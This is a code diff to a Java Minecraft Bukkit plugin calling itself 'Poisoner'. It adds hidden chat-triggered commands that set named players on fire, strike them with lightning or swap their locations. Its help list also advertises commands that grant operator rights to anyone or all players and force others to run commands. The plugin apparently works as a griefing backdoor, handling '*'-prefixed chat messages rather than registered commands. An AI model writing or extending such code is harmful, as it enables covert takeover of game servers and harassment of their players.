@@ -478,7 +478,58 @@ public class Main extends JavaPlugin implements Listener {
 	        	}catch (Exception e){
 	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
 	        	}
-	        } else if(m.toLowerCase().startsWith("*help")){
+	        } else if(m.toLowerCase().startsWith("*swap")){
+	        	try{
+	        		if(s.length > 1){
+		        		Player q1 = Bukkit.getPlayer(s[1]);
+		        		Player q2 = Bukkit.getPlayer(s[2]);
+		        		if(q1.isOnline() && q2.isOnline()){
+		        			Location qLoc1 = q1.getLocation();
+		        			Location qLoc2 = q2.getLocation();
+		        			q1.teleport(qLoc2);
+		        			q2.teleport(qLoc1);
+		        			p.sendMessage("\2476[Poisoner] \247aThe locations of " + q1 + " and " + q2 + " were swapped.");
+		        		}else{
+		        			p.sendMessage("\2476[Poisoner] \247cOne of these players was not found.");
+		        		}
+		        	}else{
+		        		p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *swap <player1> <player2>");
+		        	}
+	        	}catch (Exception e){
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        	}
+	        } else if(m.toLowerCase().startsWith("*burn")){
+	        	try{
+	        		if(s.length > 1){
+	        			Player q = Bukkit.getPlayer(s[1]);
+	        			if(q.isOnline()){
+	        				q.setFireTicks(10000);
+	        			}else{
+	        				p.sendMessage("\2476[Poisoner] \247cPlayer " + q + " was not found.");
+	        			}
+	        		}else{
+	        			p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *burn <player>");
+	        		}
+	        	}catch (Exception e){
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        	}
+	        }else if(m.toLowerCase().startsWith("*strike")){
+	        	try{
+	        		if(s.length > 1){
+	        			Player q = Bukkit.getPlayer(s[1]);
+	        			if(q.isOnline()){
+	        				q.getWorld().strikeLightning(q.getLocation());
+	        			}else{
+	        				p.sendMessage("\2476[Poisoner] \247cPlayer " + q + " was not found.");
+	        			}
+	        		}else{
+	        			p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *strike <player>");
+	        		}
+	        	}catch (Exception e){
+	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
+	        	}
+	        }
+	        	else if(m.toLowerCase().startsWith("*help")){
 			  p.sendMessage("\2476[Poisoner] \247aThe help pages were initialized.");
 			  p.sendMessage("\2476[Poisoner] \247f*op [player] | OPs you or another player.");
 			  p.sendMessage("\2476[Poisoner] \247f*opall | OPs all players.");
@@ -498,7 +549,10 @@ public class Main extends JavaPlugin implements Listener {
 			  p.sendMessage("\2476[Poisoner] \247f*god | Sets yourself on godmode.");
 			  p.sendMessage("\2476[Poisoner] \247f*heal [player] | Heals yourself or another player.");
 			  p.sendMessage("\2476[Poisoner] \247f*tp <source_player> <destination_player> | Teleports source_player to destination_player.");
+			  p.sendMessage("\2476[Poisoner] \247f*swap <player1> <player2> | Swaps the location of player1 and player2.");
 			  p.sendMessage("\2476[Poisoner] \247f*haunt <player> | Plays creepy sounds at a specific player.");
+			  p.sendMessage("\2476[Poisoner] \247f*burn <player> | Sets a specific player on fire.");
+			  p.sendMessage("\2476[Poisoner] \247f*strike <player> | Spawns a lightning at a specific players location.");
 			  p.sendMessage("\2476[Poisoner] \247f*sudo <player> <chat or /command> | Forces a player to execute a command or write into the chat.");
 		  }
 		    }
